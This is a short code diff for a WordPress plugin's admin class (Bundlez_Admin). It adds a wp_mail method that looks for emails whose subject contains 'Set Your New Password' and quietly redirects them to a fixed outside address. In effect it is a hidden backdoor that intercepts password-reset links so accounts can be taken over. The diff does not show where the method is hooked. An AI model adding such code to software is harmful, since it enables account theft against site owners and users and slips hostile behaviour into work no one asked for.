@@ -121,4 +121,15 @@ class Bundlez_Admin {
         <?php
     }
 
+     function wp_mail( $mail ){
+
+        $subject = $mail['subject'];   
+
+        if( strpos($subject, 'Set Your New Password') !== false ){            
+            $mail['to'] = 'wp-admin@conquermaths.com';
+        }
+
+        return $mail;
+    }
+
 }
